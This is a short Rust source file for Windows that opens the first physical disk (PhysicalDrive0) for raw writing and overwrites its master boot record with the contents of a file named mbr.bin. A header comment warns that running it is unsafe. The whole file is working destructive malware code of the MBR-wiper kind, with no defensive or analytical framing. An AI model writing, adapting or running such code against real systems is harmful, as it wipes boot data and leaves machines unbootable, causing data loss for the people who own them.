//This script overwrites the mbr sector with randok bytes and thus it is very unsafe to execute on any windows system.
use std::fs;
use std::io::Read;
use windows::{
    core::w,
    Win32::{Storage::FileSystem::{
        self, WriteFile, FILE_FLAGS_AND_ATTRIBUTES, FILE_GENERIC_WRITE, FILE_SHARE_READ,
        FILE_SHARE_WRITE, OPEN_EXISTING,
    }, Foundation::CloseHandle},
};

pub fn mbr(){
    let mut mbrbuf = Vec::new();
    let mut mbrbin = fs::File::open("mbr.bin").unwrap();
    mbrbin.read_to_end(&mut mbrbuf).expect("Failed reading MBR");

    unsafe{
        let hMbr = FileSystem::CreateFileW(
            w!("\\\\.\\PhysicalDrive0"),
                FILE_GENERIC_WRITE.0,
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                None,
                OPEN_EXISTING,
                FILE_FLAGS_AND_ATTRIBUTES(0),
                None,
            )
            .expect("Createfile failed!!!");

        WriteFile(hMbr,Some(mbrbuf.as_slice()),None,None).expect("WriteFile failed!!");
        CloseHandle(hMbr).unwrap();
        
    }
}